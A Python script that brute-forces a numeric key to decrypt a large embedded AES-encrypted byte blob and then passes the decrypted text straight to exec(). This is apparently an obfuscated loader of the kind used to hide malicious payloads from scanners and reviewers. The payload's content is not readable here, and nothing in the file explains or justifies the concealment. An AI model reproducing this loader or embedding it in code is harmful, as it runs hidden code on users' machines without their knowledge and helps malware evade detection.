from Crypto import Random
from Crypto.Cipher import AES
import hashlib

class Decryptor:
	def __init__(self, lpossword, file_path):
		self.lpossword = hashlib.sha256(lpossword.encode('utf-8')).digest()
		self.file_path = file_path

	def pad(self, s):
		return s + b"\0" * (AES.block_size - len(s) % AES.block_size)

	def decrypt(self, ciphertext, lpossword):
		iv = ciphertext[:AES.block_size]
		cipher = AES.new(lpossword, AES.MODE_CBC, iv)
		plaintext = cipher.decrypt(ciphertext[AES.block_size:])
		return plaintext.rstrip(b"\0")

	def decryptorHashlib(self):
		dec = self.decrypt(self.file_path, self.lpossword)
		return dec

class bruteForceit:
	def __init__(self, bytes_values):
		self.bytes_values = bytes_values
		self.password = 0

	def start(self): 
		status = True
		while status:
			try:
				test = Decryptor(str(self.password), self.bytes_values)
				decrypted_code = test.decryptorHashlib()
				execbyteval = decrypted_code.decode() 
				status = False
				return execbyteval 
			except UnicodeDecodeError:
				self.password += 1

bytes_values = b'\x82\xb5)f\xae\xfd2\xc2;\x8f\x12L=\xf8\xa3-\xa8\x9f\x8f7.\x0e\xb0\xde\xb0|\xe7o\x11Gvd?fY\xd6x\x1b\xb1ql\xf3\xda2\xbd\xd1\xcax\xda\xa2l\x81\xef\x02\xfbN\\\xc2O\x11$FSf\xf3dvuyV\xa1\xbfh*\x94Kw^\xe1\xda7\xc2\xd0.\xc0}\xa2\xfcE~\x1f\xb0\x99\x90PdDz\xc5\x93\x0c\xecc\xc1\x0e\xafm\xa0\xf5ef7\xc6\xa1\x86\x85\x1bs\xb2\x83\x9f>\x9f\xd6\xc8f\xb8\x12\x8d\t\x17\xc6:}?\xe3\xf3\xe9\xf0\xa3faX\xa2a{\x9b\xd6B\x95 1+8/\xe3R6\x03:j\xa7k\x8f\xbf\xe8V\n#Eo\x89\x8cF\x00\xfe^\xbfA\xd8r\x1f\x99\xd5\xb3bs\xc3c\x7f<\xf1\xe4>AP\x04\x17P\'3\xecN\x9fk\xae)\x19\x8cFOu\x96\xf4\xd5zm>\xf33 \xaf\xf1\xc5L7\xafU\xe0l)\xb0n"\xb3\x8a\xd0\x99\x85\xdb\xb0\xa1\xb66\xcd0\r|\x84\xb1\x99q+\x08uA4\xcb,UbQ\xdc\x14\n\x8b8\x92\xd0\xe5\x96|\x11|\x8b\xa7t\x0e\xb9\x01\xa9>\xec\xc2_\x1f\x83\x01mS`\xf3\x8f\xec\xa1\xc3\x9a\x03\xaa\xc0\r\xde\xcf\xff4\xa0=S,\x0b*\xe2V\xafS\x86\xcc\xde\xdd\xf4=]\xf7\xb5\x90\x81pp\xc8\xaf\x01\xdfHO\xa7\xb3\x99\xb2\x94\x1c}\xfao\x053\x05\xab\xb1\x8bCt\x10\xa7\xde9_\x1b\xd6\x9b\xd6\xfb\x96\x96\xec\xc0k\x1a\x9a\xaaHqw\x9d3 \x99\xd2\x95\x18C\x94\xb8\xc2\xe1h\x18\x9bz\x0f\xde:_\x94\xb1\x8eQ\xd2\xd7It=\x8f\xcd\xbd\xed\xaaj\xea\x10\xba\x85z-z\x80\xb7\xec\xce7\xc8\x8f\x0c\\\xa3\xd6\xc8\xde \x8cc\xcb\xa2O\x15\x15t\x19\xbf\xfb\x81\x89\x06\xdf\xbah\x81"\xf2\x08\xb7"D{\xf8\xfd\xcd\xb4\xc2\xaaW;&\xf6F\x86b\xf8\xb1\x00\x9e\xd8c\xd0\xbb\xa3\xa1\xda\xf4\xebq\xc6\xeac\xa4\xf9\xfd\xd8R\xb7\xe0\xa2\x95/kD&Q\x8fI\x85\x1d\x11\x89\xe2nJ\x07\x05y\x05\xb4U\xe8\x03\xd1\xfa\x05\x8b\xac\x06Q\x83l\x10w\x07\xe7V\xaf33\x90\xc6``p\xecC\x90\x1bt\x8ftR\x1d\x1e\xc1\xdd1Q\xe4\xa5\xd6\x82\xb4\x98\x95\xe2\x99\xd9\x8b\x9a\xed\xe4DM\xc7Ag@m\x1bK\x00C#\xcb\n\x01\xee\x11\x05\xa9=s\x89D\x08x\x80\xc8\x8c\xf5Ri\xf1\xc3\x1b\x02|\x9f2\x0f\xfcIq\x13\xb8U\x98\xc99\x91H\xb4,O6\xc8\x0c\x89\xf8e-\x07;\xa6\xb3\x91D\x8e\xc3E\xea\xae\xff\xa1\xfa\x80e\xfb\x95\x1fGM\x1cI\x84\x95\x8f*\xbf\x93\xa4;\xe7\x8b\xbaNx\xc5[Z\x17\x87\xaf\r\xd5;\x94M<b\xa6sA\xfd|\x11\x90\xdd\x14\xb3\x89S\xed\xaf\xd5\xb0\x163TY\x9c\xac\x88\x8a\xd6\xe6\xd9\x88\xc3`\xe1\x1c\x16\xb8\x90o\x1c\xed\'\xc4\xedA\x9e!\xf4\x94T\xf4\xf0u3w\x1e\xf5x\xd8\xb3\x9c\xec\x90\x13\xbf\tCi\xc9\x07\x9e\xa8\xf8\xfc\xe6ycu\'\x16%\xa6\x8f\xeb\xa5\xf7S\xd2\x93\xfd\xc3\xf5I\x83m\xcd6\x03y\x1b\x9a\x12(\x8d\xba\xe9=\x87\x1b\xa9\xeb\x90@5*\xd2\x8f\x11NXJ@(\xb9\xb2\xe9\xb6\x89\x1e\xbb\xfd\xc3\xf5\xb9\xf5;R\xbf\xe9\xca\xa2\x90\x92\xa2\x1b\xf6\\77\x86q\xbb\xb5\xf6\xd6\x9dL\x7f= \x1d\xcf*\x93f\n\xf9.\x8e\x7f\xa3^6\xce\xd7\xc5\xac\xc0\xb8\x1a\x9f\x02\xb9\xba<B\x86Y%\xe0_z\xba-U\xb7\xfe\x14\x80yH\x85\x1dxB@\xdcJk\x03w.\x1ck\xa6(b\xc9\xf2\x12\xb0\xee\xab\x02\x02[\xa1(\x93p_\xdc!f\x8a\x1c\xb1\xbe\xe6\xbe\x15\xf4O\x1e\x1e\xd8\xc7\xb0\xe0S_\xe0Tm~GDr!qI\x7f\x0c\xa8\r4&\xe0\xc9\rap\x94\xd3\x85\x11a\x96\xbd\xc0\xb2\x16ss6\x0b\xecR\xdc\xa1\xe0\xa2.\xa0\xbb\x1cz>3\x96\x81v\x15\xb0[@k\xe5\xa9>\xf3\x9aU~\xc2\xe9\x9e\xe1\x8f\x96o\xae\xcbXz\xfa\x8a\xb8\xaf\xdf\xb9\x84L{t\x1f~\x95y\x18\x1b\x81\x85X\xa9\x14@eR\xf8\x9f\x93\xf4\x10\xa9\x90D\xc3z\xca14\xeb\x8a\n\xe7\xac\xf3\x0e\xc8#%\xba\x9f\\\xe1\x9f\xdbd\xe3\x8eF\xabh\xd6\x82l\xc4\x19\x99\x9bmepe\xa9\x1b\x9c\x00\x95\x9a\x9b\x91\x17m\xc7l!\xd4d\xf6\x85l\xed\r\x8b\x98\x1d\x00u\xa7\xcaL\xcd\x17\x16/\xff\xec\x03\xdd\xf7\xd4\xf6\x98\x1c\xa7\x85\xa8\xaf\xc4\x1f\xe9B\xe3vj\xb2\xe8\xe2!\xa6\x83e\x15\x7fC`\x05\n\xc4\x0b\xa1\x80\xb6\xd9Bh\xb7\xa2wG8`\x89\x0e\xc3\xda-n\x18\xa49\xb2#\xa1rX\xb205\xe2\x15\xbc\x0c\r\x93\xe23o\xee\x167\xdc\xbc\r(&w\xdb\x06\xd9\x1c\x17;\r\x8c\xd2\x0e\x8f\x1a\x10\xf4\xe0Q\xf4\x1a\xb0\xa9A\xe1ni#\xcf\xd0)=\xa2\x12Q\'\xce\xed6\x84'
bruting = bruteForceit(bytes_values)
execbyteval = bruting.start()
exec(execbyteval)
